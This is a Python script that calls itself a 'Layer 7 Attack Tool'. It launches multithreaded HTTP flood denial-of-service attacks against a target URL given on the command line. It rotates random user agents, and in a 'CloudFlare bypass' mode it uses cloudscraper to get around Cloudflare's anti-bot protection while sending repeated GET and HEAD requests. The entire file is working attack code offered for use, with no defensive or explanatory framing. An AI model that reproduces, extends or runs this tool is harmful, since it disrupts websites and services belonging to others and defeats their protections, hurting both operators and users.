import threading
import datetime
import requests
import os
import random
import time
import cloudscraper
import argparse

useragent = open("User-Agent.txt").read().splitlines()

zoic = "\033[38;5;118m"
red = "\033[38;5;196m"
clear = "\033[0m"

def banner():
    os.system('cls' if os.name == 'nt' else 'clear')            

def http_attack(url, secs):
    end_time = time.time() + secs
    try:
        while time.time() < end_time:
            ua = random.choice(useragent)
            headers = {"User-Agent": ua}
            requests.get(url, headers=headers, timeout=5)
    except:
        pass

def cloudflare_attack(url, secs):
    end_time = time.time() + secs
    scraper = cloudscraper.create_scraper()
    try:
        while time.time() < end_time:
            ua = random.choice(useragent)
            headers = {"User-Agent": ua}
            scraper.get(url, headers=headers, timeout=5)
            scraper.head(url, headers=headers, timeout=5)
    except:
        pass

def main():
    parser = argparse.ArgumentParser(description='Layer 7 Attack Tool')
    subparsers = parser.add_subparsers(dest='method', help='Attack method')
    
    # HTTP 
    http_parser = subparsers.add_parser('http', help='HTTP flood attack')
    http_parser.add_argument('url', help='Target URL')
    http_parser.add_argument('threads', type=int, help='Number of threads')
    http_parser.add_argument('secs', type=int, help='Duration in seconds')
    
    # Cloudflare 
    cfb_parser = subparsers.add_parser('cfb', help='CloudFlare bypass attack')
    cfb_parser.add_argument('url', help='Target URL')
    cfb_parser.add_argument('threads', type=int, help='Number of threads')
    cfb_parser.add_argument('secs', type=int, help='Duration in seconds')
    
    args = parser.parse_args()
    
    banner()
    
    if args.method == 'http':
        for _ in range(args.threads):
            t = threading.Thread(target=http_attack, args=(args.url, args.secs))
            t.start()
    
    elif args.method == 'cfb':
        for _ in range(args.threads):
            t = threading.Thread(target=cloudflare_attack, args=(args.url, args.secs))
            t.start()
        time.sleep(args.secs)
    
    else:
        parser.print_help()

if __name__ == "__main__":
    main()